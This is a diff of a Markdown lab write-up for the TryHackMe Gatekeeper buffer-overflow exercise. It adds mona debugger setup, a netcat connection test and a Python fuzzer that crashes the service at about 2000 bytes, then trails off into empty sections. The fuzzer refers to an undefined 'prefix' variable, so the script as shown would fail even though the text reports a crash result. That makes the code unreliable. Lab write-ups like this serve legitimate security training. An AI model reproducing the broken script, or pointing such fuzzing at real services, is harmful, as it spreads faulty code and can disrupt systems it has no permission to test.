@@ -31,28 +31,164 @@
 
 ---
 
-### Lab Setup:
+--- 
 
-- I will use the same setup for `Vuln Server` Lab:
+### Mona Configuration
+
+- The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:
+
+    - `!mona config -set workingfolder c:\mona\%p`
+    
+    - ![image](https://user-images.githubusercontent.com/94720207/169673777-cf70c41e-5ce9-445f-885a-77515903a49b.png)
+ 
+---
+
+### Launching gatekeeper.exe
+
+- Launch as admin `gatekeeper.exe` server:
+
+   - ![image](https://user-images.githubusercontent.com/94720207/169685198-48829607-a781-45da-8271-456b697e2262.png)
+
+- Testing connection from a `netcat` - `nc -nv 192.168.1.100 31337` :
+
+    - ![image](https://user-images.githubusercontent.com/94720207/169685595-e1591e28-1289-4c0e-b907-9701a7bf3ba9.png)
+
+- Attach `gatekeeper.exe` to `Immunity Debugger`
+
+    - ![image](https://user-images.githubusercontent.com/94720207/169685344-36efbd2d-0f4a-47ae-a94e-6f1d50a32fdb.png)
+  
+- Lock and Loaded!
+
+---
+
+### 1. Fuzzing
+
+- The fuzzer will send increasingly long strings comprised of `A`. 
+    
+- If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. 
+    
+- Make a note of the largest number of bytes that were sent.
+
+- **Local IPv4 Version `192.168.1.100`**
+
+    - `gate_overflow_step1_fuzzing.py` (chmod +x)
+
+```python
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+ip = "192.168.1.100"
+
+port = 31337
+timeout = 5
+
+string = "A" * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
+```
+
+- ![image](https://user-images.githubusercontent.com/94720207/169685462-1b52f76f-c40a-4762-8bc0-f465c65e0f40.png)
+
+    - **Execute it:**
+
+        - **`python3 gate_overflow_step1_fuzzing.py`**
+    
+    - ![image](https://user-images.githubusercontent.com/94720207/169674064-e5f1e173-7342-4e1e-848a-0e9350bf70b1.png)
         
-    - Using Windows 10 Pro on a bare metal CPU
-        - `gatekeeper.exe` running here
-        - `Immunity Debugger` + `mona` running here
-                
-    - Using Kali Linux in a VMware Pro VM
-        - `python` scripts and tricky tricks running here
-            
-    - Both machines connected on the same Network 192.168.1.0/24 (My local Network)
-            
-    - Once I've exploited the program `gatekeeper.exe` in my own machine, then I can exploit "the real" server with the final script:
-            
-        - `TryHackMe - Gatekeeper` Network, UK.    
+    - ![image](https://user-images.githubusercontent.com/94720207/169674167-39262a16-968f-40c1-a052-d7fd0f302d61.png)
+ 
+- **Results:**
+
+- << **Initial Crash at: `2000 bytes` (A * 2000)** >> 
         
-    - So I will transfer the files from the TryHackMe Machine-FTP to a folder to my Windows 10 and use from there `Immunity Debugger` and also run the `chatserver.exe` binary.
-        
-        - ![image](https://user-images.githubusercontent.com/94720207/169637748-1ae93fc6-73a3-4e21-88ae-14f3e833c142.png)
-          
-    - Easy! Let's do it! 
+    - _Note: Restart the Lab after the crash._ 
+
+---
+
+### 2. Crash Replication
+
+
+
+
+
+---
+---
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
+---
+----
+---
 
 ---
 
